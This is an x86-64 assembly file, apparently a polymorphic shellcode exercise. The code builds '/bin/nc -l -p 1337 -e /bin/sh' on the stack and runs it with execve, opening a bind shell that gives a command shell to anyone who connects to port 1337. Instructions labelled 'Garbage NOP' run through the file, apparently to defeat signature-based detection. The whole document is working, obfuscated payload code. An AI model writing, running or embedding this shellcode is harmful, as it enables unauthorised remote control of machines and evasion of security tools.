global _start

_start:

xor rdx, rdx

inc al                                        ; Garbage NOP
inc cl                                        ; Garbage NOP

mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08

push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
stc                                           ; Garbage NOP
push 	rcx

nop                                           ; Garbage NOP
nop                                           ; Garbage NOP

mov	rcx,rsp

mov     rbx,0x652dffffffffffff

shr al, 2                                     ; Garbage NOP

shr	rbx,0x30
cdq                                           ; Garbage NOP
nop                                           ; Garbage NOP
cmc                                           ; Garbage NOP

push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff

push r15                                      ; Garbage NOP
pop r14                                       ; Garbage NOP
push r15                                      ; Garbage NOP
pop r14                                       ; Garbage NOP

shr 	r10,0x20
push 	r10
mov	r10,rsp

mov	r9,0x702dffffffffffff
shr	r9,0x30
push 	r9
mov	r9,rsp

mov 	r8,0x6c2dffffffffffff
shr	r8,0x30

loop:

rol rbp, 59                                   ; Garbage NOP
ror r14, 60                                   ; Garbage NOP
shr r13, 8                                    ; Garbage NOP

push 	r8
mov	r8,rsp

push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'

push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'

nop                                          ; Garbage NOP
stc                                          ; Garbage NOP
lea r12, [rsp - 0xFF]                        ; Garbage NOP
nop                                          ; Garbage NOP

cld                                          ; Garbage NOP
nop                                          ; Garbage NOP

push	r9   ;push address of '-p'
push	r8   ;push address of '-l'
push 	rdi  ;push address of '/bin/nc'

mov    	rsi,rsp

stc                                          ; Garbage NOP
cmc                                          ; Garbage NOP
push rsp                                     ; Garbage NOP
pop r14                                      ; Garbage NOP
push r15                                     ; Garbage NOP
pop rax                                      ; Garbage NOP

mov    	al, 0x0c                             ; Gives AL the value 0C.
add     al, 0x2f                             ; Adds AL with 2F, this will grant AL the value 3B, which is the syscall number for execve.

syscall
